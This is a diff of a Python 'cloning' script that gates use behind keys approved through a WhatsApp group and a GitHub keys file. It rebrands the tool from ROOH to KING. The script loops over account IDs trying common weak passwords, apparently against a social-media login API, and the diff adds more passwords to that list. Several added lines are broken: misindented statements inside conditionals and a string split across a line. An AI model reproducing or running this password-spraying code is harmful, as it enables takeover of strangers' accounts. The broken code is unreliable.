@@ -10,20 +10,21 @@ os.environ['LC_ALL'] = 'en_US.UTF-8'
 # ---- BANNER ----
 def banner():
     os.system('clear')
-    print("\033[1;36m" + "â–ˆ"*60 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—" + " " * 18 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘" + " " * 18 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘" + " " * 18 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘" + " " * 18 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘" + " " * 18 + "\033[0m")
-    print("\033[1;33m" + " " * 18 + "â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•" + " " * 18 + "\033[0m")
-    print("\033[1;36m" + "â–ˆ"*60 + "\033[0m")
-    print("\033[1;32m" + " " * 12 + "ðŸ’€ ROOH PAID CLONING TOOL IN FREE ðŸ’€" + " " * 12 + "\033[0m")
-    print("\033[1;36m" + "â–ˆ"*60 + "\033[0m")
-    print("\n")
+    print("\u001B[1;36m" + "█"*60 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "██║  ██║██╔═══██╗██╔═══██╗██║  ██║" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "███████║██║   ██║██║   ██║███████║" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "██╔══██║██║   ██║██║   ██║██╔══██║" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "██║  ██║╚██████╔╝╚██████╔╝██║  ██║" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;33m" + " " * 18 + "╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝" + " " * 18 + "\u001B[0m")
+    print("\u001B[1;36m" + "█"*60 + "\u001B[0m")
+    print("\u001B[1;32m" + " " * 12 + "💀 KING PAID CLONING TOOL IN FREE 💀" + " " * 12 + "\u001B[0m")
+    print("\u001B[1;36m" + "█"*60 + "\u001B[0m")
+    print("
+")
 
 # ---- WHATSAPP LINK (PLAIN TEXT â€“ NO ENCODING) ----
-WHATSAPP_LINK = "https://chat.whatsapp.com/HEzD9lTIMFRGqAjjlAINrL"
+WHATSAPP_LINK = "https://chat.whatsapp.com"
 
 def open_whatsapp():
     link = WHATSAPP_LINK
@@ -42,8 +43,8 @@ def open_whatsapp():
 
 # ---- APPROVAL ----
 def get_machine_key():
-    raw = os.getlogin() + str(os.getuid()) + "ROOH2026"
-    return "ROOH-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]
+    raw = os.getlogin() + str(os.getuid()) + "KING2026"
+    return "KING-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]
 
 def check_approval(key):
     url = "https://raw.githubusercontent.com/kingjillu/keysrooh/main/keys.txt"
@@ -59,26 +60,26 @@ def check_approval(key):
 def approval_flow():
     banner()
     key = get_machine_key()
-    print("\033[1;37mðŸ”‘ YOUR UNIQUE KEY:\033[1;33m", key, "\033[0m")
-    print("\033[1;37mðŸ“² SEND THIS KEY TO WHATSAPP GROUP FOR APPROVAL\033[0m")
-    print("\033[1;36m" + "â”€"*50 + "\033[0m")
-    print("\033[1;32m[ A ] OPEN WHATSAPP GROUP\033[0m")
-    print("\033[1;31m[ B ] CHECK APPROVAL\033[0m")
-    print("\033[1;36m" + "â”€"*50 + "\033[0m")
-    choice = input("\033[1;37mCHOOSE (A/B): \033[0m").strip().upper()
+    print("\u001B[1;37m🔑 YOUR UNIQUE KEY:\u001B[1;33m", key, "\u001B[0m")
+    print("\u001B[1;37m📲 SEND THIS KEY TO WHATSAPP GROUP FOR APPROVAL\u001B[0m")
+    print("\u001B[1;36m" + "─"*50 + "\u001B[0m")
+    print("\u001B[1;32m[ A ] OPEN WHATSAPP GROUP\u001B[0m")
+    print("\u001B[1;31m[ B ] CHECK APPROVAL\u001B[0m")
+    print("\u001B[1;36m" + "─"*50 + "\u001B[0m")
+    choice = input("\u001B[1;37mCHOOSE (A/B): \u001B[0m").strip().upper()
     if choice == 'A':
         open_whatsapp()
         time.sleep(2)
         approval_flow()
     elif choice == 'B':
         if check_approval(key):
-            print("\033[1;32mâœ… APPROVED! WELCOME TO ROOH CLONER\033[0m")
-            time.sleep(1)
+    print("\u001B[1;32m✅ APPROVED! WELCOME TO KING CLONER\u001B[0m")
+    time.sleep(1)
             return True
         else:
-            print("\033[1;31mâŒ NOT APPROVED â€“ CONTACT ADMIN ON WHATSAPP\033[0m")
-            print("\033[1;33mðŸ’¡ Make sure admin has added your key to keys.txt\033[0m")
-            time.sleep(3)
+            print("\u001B[1;31m❌ NOT APPROVED – CONTACT ADMIN ON WHATSAPP\u001B[0m")
+print("\u001B[1;33m💡 Make sure admin has added your key to keys.txt\u001B[0m")
+time.sleep(3)
             approval_flow()
     else:
         approval_flow()
@@ -122,7 +123,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mROOH-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
         sys.stdout.flush()
-        for pw in ('123456','1234567','12345678','123456789'):
+        for pw in ('123456','1234567','12345678','123456789','qwaszx','qwaszx@123','abcdef'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
